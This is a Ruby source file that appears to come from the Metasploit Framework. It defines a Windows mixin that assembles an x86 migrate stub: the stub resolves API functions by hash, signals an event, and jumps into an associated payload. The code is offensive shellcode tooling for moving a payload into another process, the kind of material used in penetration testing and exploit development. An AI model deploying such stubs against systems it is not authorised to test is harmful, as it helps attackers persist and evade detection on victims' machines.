# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/block_api'

module Msf

###
#
# Not really a payload, but more a mixin that lets common functionality
# live in spot that makes sense, so that code duplication is reduced.
#
###

module Payload::Windows::MigrateCommon

  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi

  #
  # Constructs the migrate stub on the fly
  #
  def generate(opts={})
    asm = %Q^
    migrate:
      cld
      pop esi
      pop esi             ; esi now contains the pointer to the migrate context
      sub esp, 0x2000
      call start
      #{asm_block_api}
    start:
      pop ebp
    #{generate_migrate(opts)}
    signal_event:
      push dword [esi]    ; Event handle is pointed at by esi
      push #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
      call ebp            ; SetEvent(handle)
    call_payload:
      call dword [esi+8]  ; Invoke the associated payload
    ^

    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
  end

end

end

